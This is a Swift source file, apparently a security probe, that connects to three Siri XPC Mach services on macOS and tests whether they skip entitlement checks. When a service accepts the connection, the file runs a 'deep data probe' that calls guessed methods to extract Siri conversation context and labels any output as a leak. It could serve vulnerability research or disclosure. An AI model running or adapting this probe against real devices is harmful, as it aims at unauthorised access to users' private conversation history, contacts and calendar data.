// Probe: com.apple.siri.conversation_context_module
//
// Real MachService confirmed from siriknowledged.plist on macOS 15.7.7.
// siriknowledged handles Siri's knowledge queries and conversation context.
//
// TIMEOUT = accepted connection, no entitlement check at connect time = BYPASS
// INTERRUPTED = correctly rejected
//
// If accepted, this service likely has access to:
//   - Siri conversation history
//   - User context used for knowledge resolution
//   - Reference resolution data (contacts, calendar entities)

import Foundation
import ObjectiveC

// Generic probe protocol — method names guessed from service purpose.
// TIMEOUT methodology works regardless of whether method names match.
@objc protocol ConvContextXPC: NSObjectProtocol {
    @objc optional func getConversationContext(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func contextForQuery(
        _ query: NSString?,
        reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func resolveReference(
        _ ref: NSString?,
        reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func currentContext(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func ping(
        _ reply: @escaping (Bool, Error?) -> Void)
    @objc optional func getStatus(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
}

@objc protocol RefResolutionXPC: NSObjectProtocol {
    @objc optional func resolveEntities(
        _ entities: NSArray?,
        reply: @escaping (NSArray?, Error?) -> Void)
    @objc optional func lookupEntity(
        _ name: NSString?,
        type: NSString?,
        reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func ping(
        _ reply: @escaping (Bool, Error?) -> Void)
}

@objc protocol EntityMatcherXPC: NSObjectProtocol {
    @objc optional func matchEntities(
        _ input: NSDictionary?,
        reply: @escaping (NSArray?, Error?) -> Void)
    @objc optional func adminStatus(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func ping(
        _ reply: @escaping (Bool, Error?) -> Void)
}

// ── Connection helper ──────────────────────────────────────────────────────────

func probeService(name: String, proto: Protocol, waitSecs: Int = 6) -> Bool {
    print("\n╔══ \(name) ══╗")

    let conn = NSXPCConnection(machServiceName: name, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: proto)

    var result = "(pending)"
    var alive = true
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        alive = false
        if result == "(pending)" { result = "INVALIDATED — service not found / not running" }
        sema.signal()
    }
    conn.interruptionHandler = {
        alive = false
        if result == "(pending)" { result = "INTERRUPTED — entitlement enforced (correct)" }
        sema.signal()
    }
    conn.resume()

    // Give connection 0.5s to be rejected
    Thread.sleep(forTimeInterval: 0.5)

    if !alive {
        _ = sema.wait(timeout: .now() + 1)
        print("  RESULT: \(result)")
        conn.invalidate()
        return false
    }

    print("  Connection alive after 0.5s — sending probe calls...")

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        let code = (err as NSError).code
        if code != 4099 {
            print("  [xpc-err] \(err.localizedDescription)")
        }
        if result == "(pending)" { result = "XPC-ERROR (connection live, method failed)" }
        sema.signal()
    } as AnyObject

    // Try ping-style calls
    if let p = proxy as? ConvContextXPC {
        p.ping? { v, e in
            if let e = e { print("  [ping] ERROR: \(e)") }
            else { print("  [ping] REPLY: \(v)  ← DEFINITE BYPASS") }
            if result == "(pending)" { result = "PING REPLY — method completed, NO entitlement check" }
            sema.signal()
        }
        p.getStatus? { r, e in
            if let e = e { print("  [status] ERROR: \(e)") }
            else if let r = r { print("  [status] REPLY: \(r)") }
        }
    }

    if sema.wait(timeout: .now() + .seconds(waitSecs)) == .timedOut {
        result = "TIMEOUT (\(waitSecs)s) *** ACCEPTED — NO ENTITLEMENT CHECK *** ← BYPASS"
    }

    print("  RESULT: \(result)")
    let accepted = result.contains("TIMEOUT") || result.contains("REPLY") || result.contains("BYPASS")
    conn.invalidate()
    Thread.sleep(forTimeInterval: 0.8)
    return accepted
}

// ══════════════════════════════════════════════════════════════════════════════

print("""
=== Siri Knowledge Module XPC Probe ===
PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())
macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)

Targets: real MachService names from siriknowledged.plist (confirmed on macOS 15.7.7)
""")

// ── TARGET 1: conversation_context_module ─────────────────────────────────────
let t1 = probeService(
    name: "com.apple.siri.conversation_context_module",
    proto: ConvContextXPC.self)

// ── TARGET 2: reference_resolution_module ────────────────────────────────────
let t2 = probeService(
    name: "com.apple.siri.reference_resolution_module",
    proto: RefResolutionXPC.self)

// ── TARGET 3: inference.EntityMatcher.admin ───────────────────────────────────
let t3 = probeService(
    name: "com.apple.siri.inference.EntityMatcher.admin",
    proto: EntityMatcherXPC.self)

// ── If any target accepted — run deep data probe ──────────────────────────────
if t1 || t2 || t3 {
    print("""

╔══ DEEP DATA PROBE (service accepted connection) ══╗
""")

    if t1 {
        print("\n── Deep probe: conversation_context_module ──")
        let conn = NSXPCConnection(machServiceName: "com.apple.siri.conversation_context_module", options: [])
        conn.remoteObjectInterface = NSXPCInterface(with: ConvContextXPC.self)
        conn.resume()
        Thread.sleep(forTimeInterval: 0.3)
        let proxy = conn.remoteObjectProxyWithErrorHandler { _ in } as? ConvContextXPC

        let s = DispatchSemaphore(value: 0)
        proxy?.getConversationContext? { r, e in
            if let e = e { print("  [getConversationContext] ERROR: \(e)") }
            else if let r = r { print("  [getConversationContext] DATA: \(r)  ← LEAK") }
            else { print("  [getConversationContext] nil/nil") }
            s.signal()
        }
        if s.wait(timeout: .now() + 8) == .timedOut { print("  [getConversationContext] TIMEOUT") }

        let s2 = DispatchSemaphore(value: 0)
        proxy?.currentContext? { r, e in
            if let e = e { print("  [currentContext] ERROR: \(e)") }
            else if let r = r { print("  [currentContext] DATA: \(r)  ← LEAK") }
            else { print("  [currentContext] nil/nil") }
            s2.signal()
        }
        if s2.wait(timeout: .now() + 8) == .timedOut { print("  [currentContext] TIMEOUT") }
        conn.invalidate()
    }
}

print("""

╔══ Summary ══╗
TIMEOUT / PING REPLY = bypass confirmed (no entitlement check at connect time)
INTERRUPTED          = correctly protected
INVALIDATED          = service name wrong or not running
""")
